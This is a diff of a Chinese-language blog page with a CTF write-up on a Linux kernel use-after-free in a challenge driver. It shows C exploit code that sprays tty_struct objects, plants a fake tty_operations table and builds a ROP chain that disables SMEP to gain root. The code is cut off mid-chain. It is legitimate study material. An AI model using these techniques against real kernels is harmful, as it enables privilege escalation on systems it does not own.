@@ -1,95 +1,212 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-Hans">
 <head>
-  <meta charset="utf-8">
-  
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-  
-  <title>Linux Kernel UAF | Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
   <meta name="description" content="题目概述这是一道CTF的kernel题，题目不是很难，但是可以学到很多知识，下面会用两种方法对这个题目进行解决：1.修改进程的cred结构体中权限相关的信息，将权限改为root；2.通过ROP将cr4中的smep位置反，关闭SMEP机制，然后ret2usr获取root权限。题目给出了三个文件：rootfs.cpio、bzImage和boot.sh。boot.sh内容如下： 123#!&#x2F;b">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Linux Kernel UAF">
 <meta property="og:url" content="http://example.com/2017/08/15/Linux-Kernel-UAF/index.html">
-<meta property="og:site_name" content="Hexo">
+<meta property="og:site_name" content="BruceFan&#39;s Blog">
 <meta property="og:description" content="题目概述这是一道CTF的kernel题，题目不是很难，但是可以学到很多知识，下面会用两种方法对这个题目进行解决：1.修改进程的cred结构体中权限相关的信息，将权限改为root；2.通过ROP将cr4中的smep位置反，关闭SMEP机制，然后ret2usr获取root权限。题目给出了三个文件：rootfs.cpio、bzImage和boot.sh。boot.sh内容如下： 123#!&#x2F;b">
-<meta property="og:locale" content="en_US">
+<meta property="og:locale">
 <meta property="og:image" content="http://example.com/images/linuxkernel/virtualkvm.png">
 <meta property="article:published_time" content="2017-08-15T07:44:38.000Z">
 <meta property="article:modified_time" content="2020-11-12T02:26:14.713Z">
-<meta property="article:author" content="John Doe">
+<meta property="article:author" content="Bruce Fan">
 <meta property="article:tag" content="Kernel">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/linuxkernel/virtualkvm.png">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
 
-<meta name="generator" content="Hexo 5.2.0"></head>
+<link rel="canonical" href="http://example.com/2017/08/15/Linux-Kernel-UAF/">
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>Linux Kernel UAF | BruceFan's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
-</header>
-      <div class="outer">
-        <section id="main"><article id="post-Linux-Kernel-UAF" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/08/15/Linux-Kernel-UAF/" class="article-date">
-  <time datetime="2017-08-15T07:44:38.000Z" itemprop="datePublished">2017-08-15</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      Linux Kernel UAF
-    </h1>
-  
 
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">BruceFan's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Stay hungry, stay foolish</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/08/15/Linux-Kernel-UAF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Bruce Fan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceFan's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux Kernel UAF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建于：2017-08-15 15:44:38" itemprop="dateCreated datePublished" datetime="2017-08-15T15:44:38+08:00">2017-08-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
+              </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
         <h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p>这是一道CTF的<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qYsNeKO">kernel题</a>，题目不是很难，但是可以学到很多知识，下面会用两种方法对这个题目进行解决：<br>1.修改进程的cred结构体中权限相关的信息，将权限改为root；<br>2.通过ROP将cr4中的smep位置反，关闭SMEP机制，然后ret2usr获取root权限。<br>题目给出了三个文件：rootfs.cpio、bzImage和boot.sh。boot.sh内容如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#39;console&#x3D;ttyS0 root&#x3D;&#x2F;dev&#x2F;ram oops&#x3D;panic panic&#x3D;1&#39; -enable-kvm -monitor &#x2F;dev&#x2F;null -m 64M --nographic  -smp cores&#x3D;1,threads&#x3D;1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
@@ -117,146 +234,199 @@
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_ALLOC_TIMES 0x100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> spray_fd[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* // 将tty_struct放入UAF空间，将第24字节的位置用伪造的tty_operations替换，如147、148行所示</span></span><br><span class="line"><span class="comment">tty_struct:</span></span><br><span class="line"><span class="comment">int magic; // 4</span></span><br><span class="line"><span class="comment">struct kref kref; // 4</span></span><br><span class="line"><span class="comment">struct device *dev; // 8</span></span><br><span class="line"><span class="comment">struct tty_driver *driver; // 8</span></span><br><span class="line"><span class="comment">const struct tty_operations *ops; // 8, offset = 4 + 4 + 8 + 8 = 24</span></span><br><span class="line"><span class="comment">[...]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">    <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span> (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*write)(struct tty_struct * tty,</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span> (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*ioctl)(struct tty_struct *tty,</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">    struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>)))(*_commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (*_prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Gadgets */</span></span><br><span class="line">_commit_creds commit_creds = (_commit_creds) <span class="number">0xffffffff810a1420</span>;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> native_write_cr4 = <span class="number">0xFFFFFFFF810635B0</span>; <span class="comment">// 写入cr4来关闭smep</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> xchgeaxesp = <span class="number">0xFFFFFFFF81007808</span>; <span class="comment">// 设置栈</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> poprdiret = <span class="number">0xFFFFFFFF813E7D6F</span>;</span><br><span class="line"><span class="comment">//unsigned long iretq = 0xFFFFFFFF8181A797;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = <span class="number">0xFFFFFFFF81063694</span>;  <span class="comment">// 回到用户空间之前的准备</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* status */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movq %%cs, %0\n&quot;</span> <span class="comment">// mov rcx, cs</span></span><br><span class="line">        <span class="string">&quot;movq %%ss, %1\n&quot;</span> <span class="comment">// mov rdx, ss</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span>        <span class="comment">// 把rflags的值压栈</span></span><br><span class="line">        <span class="string">&quot;popq %2\n&quot;</span>       <span class="comment">// pop rax</span></span><br><span class="line">        :<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags) : : <span class="string">&quot;memory&quot;</span> <span class="comment">// mov user_cs, rcx; mov user_ss, rdx; mov user_flags, rax</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> *buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">fake_tty_operations</span> =</span> (struct tty_operations *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct tty_operations));</span><br><span class="line"></span><br><span class="line">    save_stats();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_tty_operations, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct tty_operations));</span><br><span class="line">    fake_tty_operations-&gt;ioctl = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)xchgeaxesp; <span class="comment">// 设置tty的ioctl操作为栈转移指令</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, TTY_STRUCT_SIZE);</span><br><span class="line">    write(fd2, <span class="string">&quot;hello world&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;hello world&quot;</span>));</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray tty 这里的堆喷射其实去掉也能成功，因为是释放后紧接着申请的</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Spraying buffer with tty_struct&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SPRAY_ALLOC_TIMES; i++) &#123;</span><br><span class="line">        spray_fd[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span> (spray_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;open tty&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在有一个tty_struct落在了UAF区域里</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Reading buffer content from kernel buffer&quot;</span>);</span><br><span class="line">    <span class="keyword">long</span> size = read(fd2, buf, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span> (size &lt; <span class="number">32</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Reading not complete!&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Only %ld bytes read.\n&quot;</span>, size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查喷射是否成功</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Detecting buffer content type&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] != <span class="number">0x01</span> || buf[<span class="number">1</span>] != <span class="number">0x54</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] tty_struct spray failed&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] We should have 0x01 and 0x54, instead we got %02x %02x\n&quot;</span>, buf[<span class="number">0</span>], buf[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Exiting...&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置tty_operations为伪造的操作</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Spray complete. Modifying function pointer&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *temp = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;buf[<span class="number">24</span>];</span><br><span class="line">    *temp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fake_tty_operations;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Preparing ROP chain&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> lower_address = xchgeaxesp &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> base = lower_address &amp; ~<span class="number">0xfff</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Base address is %lx\n&quot;</span>, base);</span><br><span class="line">    <span class="keyword">if</span> (mmap(base, <span class="number">0x30000</span>, <span class="number">7</span>, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) != base) &#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rop_chain[] = &#123;</span><br><span class="line">        poprdiret,</span><br><span class="line">        <span class="number">0x6f0</span>,</span><br><span class="line">        native_write_cr4, <span class="comment">// cr4 = 0x6f0</span></span><br><span class="line">        